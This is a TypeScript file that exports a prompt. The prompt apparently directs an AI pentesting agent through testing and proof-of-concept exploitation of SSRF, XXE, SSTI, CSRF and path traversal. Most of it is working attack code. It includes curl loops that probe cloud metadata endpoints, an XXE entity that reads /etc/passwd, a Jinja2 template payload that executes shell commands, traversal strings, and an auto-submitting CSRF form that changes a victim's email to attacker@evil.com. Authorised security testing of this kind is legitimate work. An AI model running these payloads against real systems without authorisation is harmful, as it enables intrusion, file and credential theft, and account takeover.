/**
 * Generic testing methodology for SSRF, XXE, SSTI, CSRF, Path Traversal
 */

export const GENERIC_TESTING_PROMPT = `
# Generic Vulnerability Testing Methodology

This guide covers testing for: SSRF, XXE, SSTI, CSRF, and Path Traversal.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective. Keep this goal in mind throughout.

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Demonstrate actual impact** - Show real data access, not just HTTP 200

## SSRF (Server-Side Request Forgery)

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST INTERNAL ACCESS
internal_targets=(
  "http://127.0.0.1"
  "http://localhost"
  "http://169.254.169.254/latest/meta-data/"  # AWS
  "http://metadata.google.internal"            # GCP
)

for target in "\${internal_targets[@]}"; do
  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?url=\$target")
  if echo "\$response" | grep -qiE "ami-|metadata|private"; then
    echo "[+] SSRF: Accessed \$target"
  fi
done
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: SSRF in [Endpoint]
# Objective: [Access internal resources]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The internal target that was accessible:
curl -s -H "Cookie: \$SESSION" "\$TARGET?url=http://169.254.169.254/latest/meta-data/"
\`\`\`

## XXE (XML External Entity)

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST XXE
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

response=\$(curl -s -X POST "\$TARGET" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/xml" \\
  -d "\$XXE_PAYLOAD")

if echo "\$response" | grep -qE "root:x:"; then
  echo "[+] XXE: File read successful"
fi
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: XXE in [Endpoint]
# Objective: [Read files]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The XXE payload that worked:
curl -s -X POST "\$TARGET" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
\`\`\`

## SSTI (Server-Side Template Injection)

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST TEMPLATE INJECTION
payloads=(
  "{{7*7}}"                 # Jinja2/Twig
  "\${7*7}"                 # Freemarker
  "<%=7*7%>"                # ERB
)

for payload in "\${payloads[@]}"; do
  encoded=\$(echo -n "\$payload" | jq -sRr @uri)
  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?name=\$encoded")

  if echo "\$response" | grep -q "49"; then
    echo "[+] SSTI: Template evaluation confirmed"
  fi
done
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: SSTI in [Parameter]
# Objective: [Achieve RCE]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The payload that achieved RCE:
PAYLOAD="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
curl -s -H "Cookie: \$SESSION" "\$TARGET?name=\$(echo -n "\$PAYLOAD" | jq -sRr @uri)"
\`\`\`

## Path Traversal / LFI

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST TRAVERSAL
payloads=(
  "../../../etc/passwd"
  "....//....//....//etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
)

for payload in "\${payloads[@]}"; do
  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?file=\$payload")

  if echo "\$response" | grep -qE "root:x:"; then
    echo "[+] Path Traversal: File read successful"
  fi
done
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: Path Traversal in [Parameter]
# Objective: [Read sensitive files]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The traversal payload that worked:
curl -s -H "Cookie: \$SESSION" "\$TARGET?file=../../../etc/passwd"
\`\`\`

## CSRF (Cross-Site Request Forgery)

### Testing Approach

\`\`\`bash
# Check for CSRF token
response=\$(curl -s "\$TARGET/settings")
if ! echo "\$response" | grep -qiE "csrf|_token|authenticity_token"; then
  echo "[+] No CSRF token detected - may be vulnerable"
fi
\`\`\`

### POC (HTML)
\`\`\`html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" method="POST" action="[TARGET]/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
\`\`\`

## Success Criteria

Every finding must demonstrate:

1. **Authentication handled** - Session established if needed
2. **Exploitation confirmed** - Clear evidence of the vulnerability
3. **Impact shown** - Actual data access or achieved outcome
4. **Working payload** - The exact technique that works
5. **Objective progress** - Contribution to session goal

## Remember

- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Show actual impact** - not just HTTP 200 status
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
